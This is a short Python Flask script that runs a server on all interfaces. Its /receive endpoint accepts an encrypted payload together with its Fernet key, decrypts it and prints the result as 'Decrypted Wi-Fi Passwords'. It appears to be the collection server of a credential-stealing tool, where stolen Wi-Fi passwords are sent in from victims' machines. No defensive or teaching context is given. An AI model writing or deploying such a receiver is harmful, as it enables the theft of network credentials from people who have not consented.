from flask import Flask, request
from cryptography.fernet import Fernet

app = Flask(__name__)

# Function to decrypt data
def decrypt_data(encrypted_data, key):
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data.encode()).decode()
    return decrypted_data

# Route to receive data
@app.route('/receive', methods=['POST'])
def receive_data():
    try:
        # Get the JSON payload
        payload = request.json
        encrypted_data = payload["encrypted_data"]
        key = payload["key"].encode()  # Convert string back to bytes

        # Decrypt the data
        decrypted_data = decrypt_data(encrypted_data, key)
        print("Decrypted Wi-Fi Passwords:\n", decrypted_data)
        return "Data received and decrypted successfully!"
    except Exception as e:
        return f"Error: {e}"

# Run the server
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
